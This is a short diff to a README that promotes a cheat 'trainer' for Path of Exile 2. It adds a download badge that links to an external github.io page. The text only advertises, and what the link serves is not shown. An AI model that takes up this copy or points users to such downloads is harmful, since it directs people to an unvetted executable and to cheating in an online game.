@@ -4,6 +4,7 @@
 
 Grinding, farming, dying to bosses – that’s the PoE lifestyle. But what if you could flip the script? With a **Path of Exile 2 trainer**, you can turn the grind-heavy ARPG into a sandbox of pure chaos. Trainers unlock health, mana, currency, and gear at the press of a hotkey, letting you test builds, clear maps, and enjoy the game with zero limits.
 
+[![Get](https://img.shields.io/badge/Get%20The-Trainer-blueviolet)](https://path-of-exile-2-trainers.github.io/.github/)
 ---
 
 ## Product Description
